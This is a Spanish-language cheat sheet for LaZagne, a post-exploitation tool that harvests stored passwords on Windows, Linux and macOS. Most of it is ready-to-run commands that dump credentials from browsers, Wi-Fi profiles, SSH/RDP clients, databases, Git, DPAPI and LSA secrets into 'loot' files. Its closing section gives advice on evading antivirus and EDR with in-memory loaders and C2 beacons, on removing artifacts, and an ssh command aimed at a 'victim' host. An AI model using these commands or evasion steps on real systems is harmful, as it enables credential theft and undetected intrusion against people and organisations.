<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Hoja de referencia de LaZagne

[LaZagne](https://github.com/AlessandroZ/LaZagne) es una aplicación post-explotación de código abierto que se utiliza para recuperar contraseñas almacenadas en una computadora local. Es compatible con Windows, Linux y macOS en múltiples categorías, incluidos navegadores web, clientes de correo electrónico, redes Wi-Fi, software de administración de bases de datos, herramientas de administración de sistemas y cachés de memoria.

---

## Tabla de contenidos

- [Módulos y categorías compatibles](#módulos-compatibles--categorías)
- [Instalación y binarios](#instalación--binarios)
- [Recolección de credenciales de Linux](#linux-credential-harvesting)
- [Recolección de credenciales de Windows](#recolección-de-credenciales-de-Windows)
- [Ataques de categoría dirigida](#ataques-de-categoría-dirigida)
- [Formatos de salida y exportación de archivos](#output-formats--file-export)
- [Seguridad operativa y prevención de EDR] (#seguridad-operacional--evitación-edr)

---

## Módulos y categorías compatibles

LaZagne extrae credenciales de decenas de aplicaciones agrupadas en categorías:
- **Navegadores:** Chrome, Firefox, Edge, Opera, Brave, Chromium (historial, autocompletar, cookies, credenciales).
- **Herramientas de administrador de sistemas:** WinSCP, PuTTY, OpenSSH (claves/configuración `id_rsa`), RDP/mstsc, FileZilla, Cyberduck, VNC.
- **Bases de datos:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi:** Claves precompartidas (PSK) WPA2/WPA3 almacenadas en perfiles de red del sistema operativo.
- **Desarrollador y VCS:** Credenciales de Git (`.git-credentials`, caché), SVN, tokens de Docker, credenciales de AWS CLI.
- **Correo electrónico y chat:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault y DPAPI:** Secretos de LSA, claves maestras de DPAPI, elementos de la bóveda de Credential Manager.

---

## Instalación y binarios
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Recolección de credenciales de Linux

### 1. Ejecute todos los módulos de extracción
```bash
python3 laZagne.py all
```
### 2. Ejecutar con privilegios de Root/Sudo (amplía el acceso a la sombra y al llavero)
La ejecución como `root` desbloquea secretos del sistema, perfiles de Wi-Fi en `/etc/NetworkManager` y claves SSH en todos los directorios de `/home/*`:
```bash
sudo python3 laZagne.py all
```
### 3. Extraer contraseñas de Gnome Keyring / KWallet
```bash
python3 laZagne.py sysadmin -k
```
---

## Recolección de credenciales de Windows

En Windows, utilice el ejecutable independiente `lazagne.exe`:

### 1. Extraiga todas las contraseñas almacenadas
```cmd
lazagne.exe all
```
### 2. Ejecutar con privilegios elevados (Administrador/SISTEMA)
Extraiga claves maestras DPAPI, secretos LSA y credenciales de dominio almacenadas en caché:
```cmd
lazagne.exe all -v
```
### 3. Extraer contraseñas para un usuario específico (cuando se ejecuta como administrador)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## Ataques de categorías dirigidas

En lugar de ejecutar todos los módulos, especifique las categorías de software de destino para minimizar la actividad y el ruido del disco:

### 1. Sólo navegadores web
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. Contraseñas de texto sin cifrar de Wi-Fi
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. Herramientas de acceso remoto y administrador de sistemas (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. Clientes de bases de datos
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. Credenciales de desarrollador y Git
```bash
# Linux
python3 laZagne.py git
```
---

## Formatos de salida y exportación de archivos

Guarde las credenciales recopiladas directamente en el disco en formatos estructurados:

### Exportar a formato JSON
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Crea `/tmp/loot_credentials.json` que contiene credenciales estructuradas, URL, nombres de usuario y contraseñas de texto sin formato.

### Exportar a texto sin formato
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Crea `/tmp/loot_credentials.txt`.

---

## Seguridad operativa y prevención de EDR

- **Detección de antivirus:** El `lazagne.exe` independiente está fuertemente firmado por Windows Defender y soluciones EDR comerciales.
- **Ofuscación y ejecución en memoria:**
  - Ejecutar mediante reflexión de PowerShell o cargadores en memoria (`donut`, `execute-assembly` en Cobalt Strike/Sliver).
  - Utilice la versión fuente de Python con un entorno virtual personalizado en lugar del binario PyInstaller empaquetado.
- **Limpiar artefactos:** Elimina archivos de botín temporales o redirige la salida directamente a través de la salida estándar a través de una baliza C2 cifrada o una sesión SSH:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```